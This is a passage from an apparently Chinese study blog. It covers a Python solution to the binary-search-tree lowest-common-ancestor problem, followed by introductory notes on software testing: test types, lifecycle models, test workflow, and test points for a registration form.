<h4 id="分析-31"><a href="#分析-31" class="headerlink" title="分析"></a>分析</h4><p>这道题先初始化定义了一个 set() 集合变量 s ；<br>首先后判断树是否为空，判断 k 减去当前根结点之后的值是否在集合中，如果是则返回 true；<br>然后向集合中加入当前根结点的值元素，最后递归调用返回遍历左子树与 k 和遍历右子树与 k 的结果</p>
<h3 id="235-二叉搜索树的最近公共祖先-【中等】"><a href="#235-二叉搜索树的最近公共祖先-【中等】" class="headerlink" title="235. 二叉搜索树的最近公共祖先  【中等】"></a>235. 二叉搜索树的最近公共祖先  【中等】</h3><h4 id="题目描述-32"><a href="#题目描述-32" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。</p>
<p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大<strong>（一个节点也可以是它自己的祖先）</strong>。”</p>
<p>例如，给定如下二叉搜索树:  root = [6,2,8,0,4,7,9,null,null,3,5]</p>
<p><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/235.png"></p>
<p><strong>示例 1:</strong><br><code>输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8 输出: 6  解释: 节点 2 和节点 8 的最近公共祖先是 6。</code></p>
<p><strong>示例 2:</strong><br><code>输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4 输出: 2 解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。</code></p>
<h4 id="代码-32"><a href="#代码-32" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lowestCommonAncestor</span>(<span class="params">self, root, p, q</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type p: TreeNode</span></span><br><span class="line"><span class="string">        :type q: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ancestor = root</span><br><span class="line">        <span class="keyword">while</span> ancestor:</span><br><span class="line">            <span class="keyword">if</span> p.val &lt; ancestor.val <span class="keyword">and</span> q.val &lt; ancestor.val:</span><br><span class="line">                ancestor = ancestor.left</span><br><span class="line">            <span class="keyword">elif</span>  p.val &gt; ancestor.val <span class="keyword">and</span> q.val &gt; ancestor.val:</span><br><span class="line">                ancestor = ancestor.right</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> ancestor</span><br></pre></td></tr></table></figure>


<h4 id="分析-32"><a href="#分析-32" class="headerlink" title="分析"></a>分析</h4><p>从根节点开始遍历；</p>
<ul>
<li>如果当前节点的值大于 p 和 q 的值，说明 p 和 q 应该在当前节点的左子树；</li>
<li>如果当前节点的值小于 p 和 q 的值，说明 p 和 q 应该在当前节点的右子树；</li>
<li>如果当前节点的值不满足上述两条要求，那么说明当前节点就是 祖先结点 （分叉点）。</li>
</ul>
<h1 id="数据结构基础"><a href="#数据结构基础" class="headerlink" title="数据结构基础"></a>数据结构基础</h1>]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>软件测试</title>
    <url>/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h2 id="软件测试的定义和分类"><a href="#软件测试的定义和分类" class="headerlink" title="软件测试的定义和分类"></a>软件测试的定义和分类</h2><h3 id="软件测试定义"><a href="#软件测试定义" class="headerlink" title="软件测试定义"></a>软件测试定义</h3><p><strong>软件</strong> 就是 <span class="label danger">计算机程序、程序所用数据及有关文档资料的合集</span>。分为两大类：<strong>系统软件</strong>和<strong>应用软件</strong>。</p>
<ul>
<li><strong>系统软件：</strong> 就是生成、准备和执行其他程序所需要的一组文件和程序。如操作系统Windows、数据库SQL Server、驱动程序（网卡/声卡）、Java语言系统编译环境等。</li>
<li><strong>应用软件：</strong> 计算机用户为了解决某些具体问题而购买、开发或研制的各种程序或软件包。如APP、QQ、微信等。</li>
</ul>
<p>一般软件测试的对象是指应用软件的程序、程序所用数据及其资料合集。</p>
<p><strong>应用软件架构</strong> 一般分为 <strong>C/S(客户端/服务器)</strong> 与 <strong>B/S(浏览器/服务器)</strong> 架构，它们之间的主要区别是是否需要单独安装/更新客户端。</p>
<ul>
<li><strong>C/S(Client- Server)：</strong> 需要安装客户端才能使用，缺点是每次更新都需要更新客户端与服务端。比如超市收银系统每次更新每台电脑都需要重装客户端，导致花费大量人力物力，重启也会导致业务中断。</li>
<li><strong>B/S(Browser-Server)：</strong> 只需要浏览器即可访问服务，优点是只须更新服务器即可，用户主动性比较高。比如天猫、淘宝等。</li>
</ul>
<p>平时手机上使用的APP就属于移动端C/S架构。</p>
<p><strong>软件测试</strong> 就是使用  <span class="label danger">人工或自动</span> 手段来运行或测试某个系统的过程，其目的在于检测软件它是否满足规定的需求或弄清预期结果与实际结果之间的差别。</p>
<p><strong>为什么要做软件测试？目的是什么？</strong></p>
<ol>
<li>为了发现程序（软件）存在的代码或业务逻辑错误（功能问题、bug、熟悉产品需求）</li>
<li>为了检验产品是否符合用户需求，满足质量要求（用户需求、质量需求）</li>
<li>为了提高用户的体验（流畅度、性能范畴）</li>
</ol>
<h3 id="软件测试分类"><a href="#软件测试分类" class="headerlink" title="软件测试分类"></a>软件测试分类</h3><h4 id="按方法分"><a href="#按方法分" class="headerlink" title="按方法分"></a>按方法分</h4><p><strong>黑盒测试、白盒测试、灰盒测试</strong></p>
<ul>
<li><p>黑盒测试：把软件比作一个“黑匣子”，不考虑具体是内部代码是如何实现的，只考虑外部功能的运行，检查软件的输入和输出是否匹配。 </p>
</li>
<li><p>白盒测试：检查软件的代码（逻辑）、函数和方法等内部结构。</p>
</li>
<li><p>灰盒测试：介于白盒和灰盒测试之间，既可以根据外部暴露出的功能进行检测，也可以参考内部的代码结构。</p>
</li>
</ul>
<p><strong>黑盒测试</strong>主要的方法有：等价类划分法、边界值分析法、错误推测法、因果图法、决策表法、场景法、正交试验设计法等。</p>
<p><strong>白盒测试</strong>的主要方法有：逻辑覆盖（语句覆盖、判定覆盖、条件覆盖、判定/条件覆盖、条件组合覆盖、路径覆盖），基本路径测试等。</p>
<p><code>边界值法既可以用于黑盒测试用例，也可以用于白盒测试用例</code></p>
<h4 id="按方向分"><a href="#按方向分" class="headerlink" title="按方向分"></a>按方向分</h4><p>**功能测试、性能测试、安全测试、界面测试、兼容性测试、易用性测试 **</p>
<p>（1）功能测试：测试产品的功能，测试业务逻辑，以确定是否满足设计需求。</p>
<p>（2）性能测试：分为客户端测试和服务器端测试（一般默认是服务器端测试）。</p>
<ul>
<li><p>客户端性能测试：启动速度、消耗资源（CPU、内存、硬盘、流量、电量）</p>
</li>
<li><p>服务端性能测试（默认）：压力测试、负载测试、并发测试</p>
</li>
<li><p>压力测试：获取系统正确运行的上限，检查软件在瞬间峰值的情况下是否能够正确运行（通过多线程模拟）</p>
</li>
<li><p>负载测试：在峰值的持续压力下运行软件，看软件的承载极限达到什么程度。（在一定的工作负荷下，系统的负荷及响应时间）</p>
</li>
<li><p>并发测试：检查在并发条件下，会不会出现数据错乱的情况（比如淘宝秒杀）</p>
</li>
<li><p>强度测试：在一定的负荷条件下，在较长时间跨度内的系统连续运行给系统性能所造成的影响。</p>
</li>
<li><p>容量测试：容量测试目的是通过测试预先分析出反映软件系统应用特征的某项指标的极限值（如最大并发用户数、数据库记录数等），系统在其极限值状态下没有出现任何软件故障或还能保持主要功能正常运行。容量测试还将确定测试对象在给定时间内能够持续处理的最大负载或工作量。</p>
<p><strong>目的</strong>是使系统承受超额的数据容量来发现它是否能够正确处理，是面向数据的，并且它的目的是显示系统可以处理目标内确定的数据容量。</p>
</li>
</ul>
<p>（3）安全测试：流量攻击、渗透、SQL注入、跨域攻击、爆破、劫持。</p>
<ul>
<li><p>流量攻击：模拟大量用户访问服务器，不进行任何有效操作，无端消耗服务器资源。</p>
</li>
<li><p>渗透测试：发现软件系统中存在的漏洞，判断系统的安全性。</p>
</li>
<li><p>SQL注入：通过数据库的关键字进行异常操作，恶意执行不相干的SQL命令。</p>
</li>
<li><p>跨域攻击：诱导用户访问非法网站，利用会话信息模拟请求，盗取和篡改数据。（比如qq盗号）</p>
</li>
<li><p>暴力破解：写相应的脚本，用穷举法不断尝试破解对方的信息。</p>
</li>
<li><p>劫持：比如通过不安全的wifi连接，进行表单提交的操作，造成数据泄露。（还有网页广告弹窗等）</p>
</li>
</ul>
<p>（4）界面测试：通过用户界面 (UI, User-interface) 测试来核实用户与软件的交互，检验用户界面的功能模块的布局是否合理、整体风格是否一致、各个控件的放置位置是否符合客户使用习惯。（与需求文档中原型图Demo、UI切图对比）</p>
<p>（5）兼容性测试：检查软件之间能否正确地进行交互和共享信息，检查硬件、软件、数据库、浏览器、操作系统、新老版本数据兼容。</p>
<ul>
<li><p>向前兼容与向后兼容：向前兼容是指可以使用软件的未来版本，向后兼容是指可以使用软件的以前版本。</p>
</li>
<li><p>不同版本间的兼容：实现测试平台和应用软件多个版本之间能够正常工作</p>
</li>
<li><p>标准和规范：适用于软件平台的标准和规范有两个级别：高级标准和低级标准。</p>
</li>
<li><p>数据共享兼容：在应用程序之间共享数据，要求支持并遵守公开的标准，允许用户与其他软件无障碍的传输数据。</p>
</li>
</ul>
<p>（6）易用性测试：检查用户使用软件时是否感觉方便，比如是否最多点击鼠标三次就可以达到用户的目的。（可用性是指是否可以使用，而易用性是指是否方便使用）</p>
<h4 id="按阶段分"><a href="#按阶段分" class="headerlink" title="按阶段分"></a>按阶段分</h4><p><strong>单元测试、集成测试、系统测试、验收测试、α测试、β测试</strong></p>
<ul>
<li><p>单元测试：最小模块的测试，可以是对代码、函数、方法进行白盒测试，一般由开发人员执行。</p>
</li>
<li><p>集成测试：主要是测试接口，所以也叫接口测试。（接口：模块与模块之间数据交换的通道。）</p>
</li>
<li><p>系统测试：对系统的功能、性能、安全、UI、稳定性、易用性、兼容性等进行测试。</p>
</li>
<li><p>验收测试：软件发布之前进行的测试，这是测试的最后一个阶段，也叫交付测试，评估产品是否可以发布。</p>
</li>
<li><p>α测试：产品内测。</p>
</li>
<li><p>β测试：产品公测。</p>
</li>
</ul>
<h4 id="按对象分"><a href="#按对象分" class="headerlink" title="按对象分"></a>按对象分</h4><p><strong>web测试、app测试、小程序测试、车联网测试、物联网测试</strong></p>
<p>测试方法与测试对象无关，测试流程基本都是通用的。</p>
<h4 id="按状态分"><a href="#按状态分" class="headerlink" title="按状态分"></a>按状态分</h4><p><strong>动态测试、静态测试（测试对象软件是否运行）</strong></p>
<ul>
<li><p>动态测试：运行软件，判断软件运行结果与预期结果的差异，检查软件的正确性。（黑盒测试）</p>
</li>
<li><p>静态测试：不运行软件，检查软件代码、方法、函数、文档的正确性。（白盒测试）</p>
</li>
</ul>
<h4 id="按手段分"><a href="#按手段分" class="headerlink" title="按手段分"></a>按手段分</h4><p><strong>手工测试、自动化测试</strong></p>
<ul>
<li>手工测试：通过人为的逻辑判断检验当前的软件运行结果、代码、文档等是否正确</li>
<li>自动化测试：通过测试管理工具或脚本对象来实现自动判断当前当前的软件运行结果、代码、文档等是否正确（有一定局限性）</li>
</ul>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><strong>回归测试，冒烟测试、探索性测试/自由测试（测试思维）</strong></p>
<ul>
<li>回归测试：检查开发有没有把bug修改好，重新测试一遍，并检查其他未修改模块是否被影响，以保持正确性。</li>
<li>冒烟测试：测试前的测试，检查开发是否进行自测（验证产品核心业务功能），软件是否具有可测试性。</li>
<li>探索性测试：发散测试，事先不进行计划和设计，一般由有经验的测试人员根据实际情况、自身经验以及对系统的认识来进行测试。</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/1.png" class>

<img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/2.png" class>



<h3 id="常见笔试面试题"><a href="#常见笔试面试题" class="headerlink" title="常见笔试面试题"></a>常见笔试面试题</h3><ol>
<li><strong>什么是软件测试？软件测试的目的是什么？</strong></li>
</ol>
<ol start="2">
<li><strong>软件测试分类有哪些？</strong></li>
</ol>
<ol start="3">
<li><strong>什么是黑盒测试？什么是白盒测试？方法有哪些？</strong></li>
</ol>
<h2 id="软件测试的生命周期及流程"><a href="#软件测试的生命周期及流程" class="headerlink" title="软件测试的生命周期及流程"></a>软件测试的生命周期及流程</h2><h3 id="生命周期定义"><a href="#生命周期定义" class="headerlink" title="生命周期定义"></a>生命周期定义</h3><p><strong>软件生命周期</strong>（SDLC, System Development Life Cycle）是 <strong>软件开始研制到最终废弃不用</strong> 所经历的各个阶段。—— <strong>软件开发模型</strong></p>
<h3 id="生命周期模型"><a href="#生命周期模型" class="headerlink" title="生命周期模型"></a>生命周期模型</h3><p><strong>一、问题的定义及规划</strong></p>
<p>确定软件的开发目的及其可行性，制定项目总体开发计划。</p>
<p><strong>二、需求分析</strong></p>
<p>在确定软件开发可行的情况下，对软件需要实现的各个功能进行详细分析，明确客户的需求（需求评审——产品、开发、测试），输出 <strong>需求规格说明书最终版</strong> （原型图）。</p>
<p><strong>三、设计（开发）</strong></p>
<p>把需求分析得到的结果转换为软件结构和数据结构，形成系统架构。</p>
<ul>
<li><strong>概要设计</strong>：主要是架构的实现，指搭建架构、表述各模块功能、模块接口和数据传递的实现等项事务。</li>
<li><strong>详细设计</strong>：对概要设计中表述的各模块进行深入分析等，其中需要包含数据库设计说明。</li>
</ul>
<p><strong>四、编码</strong></p>
<p>按照详细设计好的模块功能表，编程人员写出计算机可运行的程序代码。</p>
<img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/3.png" class>

<p><strong>五、软件测试</strong> 【重点】</p>
<p>软件设计完成后要经过严密的测试，以发现软件在整个设计过程中存在的问题并加以纠正。</p>
<p>测试方法主要有<strong>黑盒测试</strong>、<strong>白盒测试</strong>两种，建立详细的测试计划并严格按照计划执行。</p>
<ul>
<li><strong>单元测试</strong>：主要是测试程序代码，为的是确保各单位模块被正确的编译，比如有具体到模块的测试，也有具体到类、函数、方法的测试等。 —— 开发自测（白盒测试）</li>
<li><strong>集成测试</strong>：单元测试后，将各单元组合成完整的体系，测试软件单位之间的接口是否正确、数据能否正常传递。 —— 接口测试</li>
<li><strong>系统测试</strong>：把软件系统搭建起来，按照软件规格说明书中所要求，测试软件其性能、功能、界面、安全等是否和用户需求相符合，在系统中运行是否存在漏洞等。 —— 最重要、常见的(Web, app)</li>
<li><strong>验收测试</strong>：主要就是用户在拿到软件的时候，在使用现场，会根据前边所提到的需求，以及规格说明书来做相应测试，以确定软件达到符合效果的。 —— UAT（用户，产品（领导）），有依据有用例</li>
</ul>
<p>之后进行 <strong>内测</strong> ——<strong>公测</strong> —— <strong>预发布环境、生产环境部署测试 （紧急修复，回滚原版本）</strong> —— <strong>上线发布</strong></p>
<p><strong>六、运行维护</strong>（项目）</p>
<p>软件维护是软件生命周期持续时间<strong>最长的</strong>阶段。在软件开发完成并投入使用后，由于多方面的原因，软件不能继续适应用户的需求，要延续软件的使用寿命，就必须对软件进行维护。软件的维护主要包括两个方面：</p>
<ul>
<li><strong>纠错性维护</strong> ：bug 修复，修改代码 —— 新版本</li>
<li><strong>改进性维护</strong> ： 优化、完善、改良 —— 新版本</li>
</ul>
<img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/4.png" class>





<h4 id="瀑布型生命周期模型"><a href="#瀑布型生命周期模型" class="headerlink" title="瀑布型生命周期模型"></a>瀑布型生命周期模型</h4><p> 人类历史上第一个软件生命周期模型，诞生于1970年。（已被废弃不用）</p>
<ul>
<li><p>它规定各阶段自上而下、相互衔接的固定次序，如同瀑布流水，逐级下落，具有顺序性和依赖性，且每个阶段规定文档并需进行评审。</p>
</li>
<li><p>缺点：测试介入晚、回溯成本高、项目周期长、效率低</p>
</li>
</ul>
<img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/5.png" class>



<h4 id="V-模型"><a href="#V-模型" class="headerlink" title="V 模型"></a>V 模型</h4><p> 快速应用开发（RAD, Rap Application Development）模型是软件开发过程中的一个重要模型，因其模型结构图形似字母V又称V模型。</p>
<ul>
<li><p>它通过开发和测试同时进行的方式来缩短开发周期，提高开发效率。</p>
</li>
<li><p>优点：测试提前在准备测试文档（用例），可以直接执行测试，节省了准备文档的时间，提高效率，拉短周期</p>
</li>
</ul>
<img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/6.png" class>



<h4 id="敏捷开发模型"><a href="#敏捷开发模型" class="headerlink" title="敏捷开发模型"></a>敏捷开发模型</h4><p>1990年随着互联网发展兴起，是一种<strong>以人为核心、快速迭代、循序渐进</strong>的开发方法。强调以人为本、专注于交付对客户有价值的软件。是一个用开发和维持复杂产品的框架。</p>
<ul>
<li><p>就是把一个大项目分为多个相互联系但可独立运行的小项目，并分别完成（需要做回归测试），在此过程中软件一直处于可使用状态。</p>
</li>
<li><p>项目周期（迭代周期）短：1个月、2周、1周</p>
</li>
<li><p>优点：弱化文档、加强人之间沟通（快速高效处理）</p>
</li>
</ul>
<h4 id="可扩展其他模型："><a href="#可扩展其他模型：" class="headerlink" title="==可扩展其他模型：=="></a>==可扩展其他模型：==</h4><h5 id="DevOps开发模型：（现在）"><a href="#DevOps开发模型：（现在）" class="headerlink" title="DevOps开发模型：（现在）"></a>DevOps开发模型：（现在）</h5><p><a href="https://blog.csdn.net/weixin_45735355/article/details/120450264">DevOps</a>方法就是基于对更好的协作和更快的交付的需求而产生的。DevOps允许用较少复杂问题的持续软件交付来修复和更快地解决问题。</p>
<p>DevOps是一种软件开发方法，涉及软件在整个开发生命周期中的持续开发，持续测试，持续集成，持续部署和持续监控。 这些活动只能在DevOps中实现，而不是敏捷或瀑布，这就是为什么顶级互联网公司选择DevOps作为其业务目标的前进方向。 DevOps是在较短的开发周期内开发高质量软件的首选方法，可以提高客户满意度。</p>
<h3 id="软件测试工作流程"><a href="#软件测试工作流程" class="headerlink" title="软件测试工作流程"></a>软件测试工作流程</h3><img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/7.png" class>





<p><strong>测试需求分析阶段：</strong>阅读需求，理解需求。主要就是对业务的学习，分析需求点，参与需求评审会议。</p>
<p><strong>测试计划阶段：</strong>编写测试计划，参考软件需求规格说明书、项目总体计划。内容包括测试范围（来自需求文档）、进度安排、人力物力的分配、整体测试策略的制定，和风险的评估与规避措施有一个制定，一般由测试负责人编写。</p>
<p><strong>测试设计阶段：</strong>主要任务是编写测试用例，会参考需求文档（原型图）、概要设计、详细设计等文档，有不明确的也会及时和开发、产品经理沟通。用例编写完后会进行评审。</p>
<p><strong>测试执行阶段：</strong>首先搭建测试环境，执行预测（冒烟），以判定当前版本可测与否，如果预测通过，正式进入系统测试（2-4轮），遇到问题提交Bug道缺陷管理平台，并对bug进行跟踪，直到被测软件达到测试需求要求，没有重大bug则测试结束。（完善测试用例）</p>
<p><strong>测试评估阶段：</strong>出测试报告，对整个测试的过程和版本质量做一个详细的评估（剩余bug数量/严重程度，测试用例的覆盖率）。确认是否可以上线。</p>
<p><strong>UAT测试阶段：</strong>部署到UAT测试环境，由产品或领导来验证功能。（验收测试）</p>
<ul>
<li>开发环境： 开发自己开发的环境（自测，UT (Unit Test)报告）</li>
<li>测试环境：执行测试的环境</li>
<li>生产环境：用户使用的环境（线上）</li>
<li>预发布环境：验收测试（尽量模拟用户环境）</li>
</ul>
<h3 id="常见笔试面试题-1"><a href="#常见笔试面试题-1" class="headerlink" title="常见笔试面试题"></a>常见笔试面试题</h3><ol>
<li><strong>生命周期模型包含哪些阶段？</strong></li>
</ol>
<ol start="2">
<li><strong>测试流程包含哪些阶段？</strong></li>
</ol>
<ol start="3">
<li><strong>开发流程是怎样的？</strong></li>
</ol>
<ol start="4">
<li><strong>测试流程是怎样的？各阶段输出是什么？</strong></li>
</ol>
<ol start="5">
<li><strong>开发环境、测试环境、生产环境是什么？测试环境后台添加的数据和信息，能够在生产环境看到吗？</strong></li>
</ol>
<h2 id="测试需求分析"><a href="#测试需求分析" class="headerlink" title="测试需求分析"></a>测试需求分析</h2><p>测试需求主要解决<strong>“测什么”</strong>的问题，一般来自需求规格说明书中原始需求</p>
<p>测试需求应全部覆盖已定义的业务流程，以及<strong>功能和非功能</strong>（性能、安全、兼容性、易用性、界面）方面的需求。</p>
<p>————提炼测试点、时间规划、人力规划、测试环境</p>
<img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/8.png" class>

<h3 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h3><ol>
<li><p>明确项目是做什么的？</p>
<p>基本业务逻辑/需求流程：流程图（主流、分支流程）。比如淘宝——注册、登录、商品浏览、购物车、提交订单、支付</p>
</li>
<li><p>细化每一个功能</p>
<p>细化分析提取测试点：如注册、登录</p>
</li>
<li><p>所有的细化模块的分析</p>
<p>组合在一起，完成项目的（功能）测试点 </p>
</li>
<li><p>非功能</p>
<p>界面、易用性、兼容性、安全性、性能压力</p>
</li>
</ol>
<h3 id="【案例分享】"><a href="#【案例分享】" class="headerlink" title="【案例分享】"></a><strong>【案例分享】</strong></h3><table>
<thead>
<tr>
<th align="center">运行条件</th>
<th>用户未注册</th>
</tr>
</thead>
<tbody><tr>
<td align="center">输入</td>
<td>访问网站 –&gt; 点击注册</td>
</tr>
<tr>
<td align="center">业务处理流程</td>
<td><strong>主流程：</strong><br>1. 单击“注册”按钮；<br>2. 用户输入手机号码、图片验证码、短信验证码、密码、勾选同意协议、点击“下一步”。 <br><strong>规则约束：</strong><br>1. 图片验证码为4位字母或数字字母混合<br>2. 短信验证码为4位数字，有效期60s<br>3. 密码长度为8～16位，数字、字母、符号至少包含2种<br><strong>其他流程：</strong><br>1. 支持首页跳转<br>2. 支持投标页面跳转</td>
</tr>
<tr>
<td align="center">输出</td>
<td>1. 弹框显示“欢迎加入蜂群”？<br>2. 选择“加入蜂群”，输入蜂群名称，点击确定，加入蜂群申请成功<br>3. 选择“系统自动分配”，直接加入系统分配的蜂群<br>4. 注册成功</td>
</tr>
</tbody></table>
<h4 id="测试点思路步骤："><a href="#测试点思路步骤：" class="headerlink" title="测试点思路步骤："></a><strong>测试点思路步骤：</strong></h4><p>​    <strong>正常+异常 —— 单个功能</strong></p>
<ol>
<li><p><strong>正常功能</strong></p>
<p>是否可以正常提交——注册成功——单个功能冒烟测试</p>
</li>
<li><p><strong>单个功能项验证（正常+异常）</strong></p>
<p>规则：按顺序从上到下，对每一个输入项进行验证</p>
<p>1）数据长度、数据类型验证、必填项验证、重复</p>
<p>2）限制约束验证</p>
<p>3）隐形需求：充分熟悉产品业务，挖掘隐性需求</p>
</li>
<li><p><strong>功能交互验证</strong></p>
<p>模块之间传递的信息和数据，对存在功能交互的功能项</p>
</li>
<li><p><strong>非功能性测试</strong></p>
<p>界面、易用性、兼容性、安全性、性能压力</p>
</li>
</ol>
<h4 id="需求分析："><a href="#需求分析：" class="headerlink" title="需求分析："></a><strong>需求分析：</strong></h4><table>
<thead>
<tr>
<th align="center">序号</th>
<th align="center">验证项</th>
<th>测试点</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">注册</td>
<td>输入所有正确输入项，点击下一步，验证是否注册成功</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">手机号码</td>
<td>长度是否符合要求</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>数据类型是否符合要求</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>是否必填项</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>是否能重复（同一个号码重复注册）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>市面不存在号段验证，如199  （开发：没有支持新号段 — bug）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>国内外、境外卡验证（测试数据）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>特殊号码，如110等（不一定需要测试，长度检查已覆盖）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>填写时能否加前缀、是否需要添加前缀，如86等（产品：需求确认）</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">图片验证码</td>
<td>长度是否符合要求（刷新出来的验证码是否一致）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>数据类型是否符合要求（刷新出来的验证码是否一致）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>是否必填项</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>时效性验证（刷新后，之前的验证码过期）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>显示是否同步（初始显示，刷新后更改）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>是否区分大小写（产品：需求确认）</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">短信验证码</td>
<td>长度是否符合要求</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>数据类型是否符合要求</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>是否必填项</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>有效期验证</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">密码</td>
<td>长度是否符合要求</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>数据类型是否符合要求</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>是否必填项</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">同意协议</td>
<td>是否勾选（可点击范围确认） —— 默认值：不勾选</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>是否需要浏览文档（检查文档——静态测试）</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">下一步</td>
<td>按钮能否点击</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>重复点击</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td>是否支持回车确认</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">功能交互</td>
<td>注册之后用户是否能正常登录（自动登录或手动登录）</td>
</tr>
</tbody></table>
<h3 id="常见笔试面试题-2"><a href="#常见笔试面试题-2" class="headerlink" title="常见笔试面试题"></a>常见笔试面试题</h3><ol>
<li><p><strong>遇到隐性需求怎么办？</strong></p>
<p>根据经验，充分熟悉产品业务的基础上，参考成熟产品。向产品确认需求。</p>
</li>
<li><p><strong>给一个带logo水杯，如何去测试？（电梯，A4，笔）</strong></p>
</li>
</ol>
<p>​    <strong>功能：</strong> 装水、喝水、漏水、容量、盖子、保温</p>
<p>​    <strong>界面：</strong> 外观、logo正确、颜色、大小、形状、刻度 （用户需求）</p>
<p>​    <strong>易用：</strong> 便携、带子、吸管、好不好喝水、好不好拿</p>
<p>​    <strong>兼容：</strong> 各种材质液体、杯垫、桌子</p>
<p>​    <strong>安全：</strong> logo侵权、有毒材质</p>
<p>​    <strong>性能：</strong> 耐高温、抗压、抗摔、抗低温、裂开</p>
<ol start="3">
<li><p><strong>如何测试朋友圈、购物车等熟知的软件产品（支付，优惠券，微信等）</strong></p>
<p>6个方面（主要是功能方面）</p>
</li>
</ol>
<h2 id="测试用例设计方法"><a href="#测试用例设计方法" class="headerlink" title="测试用例设计方法"></a>测试用例设计方法</h2><p>软件测试的<strong>核心</strong>是<strong>测试用例的编写</strong>。</p>
<img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/9.png" class>



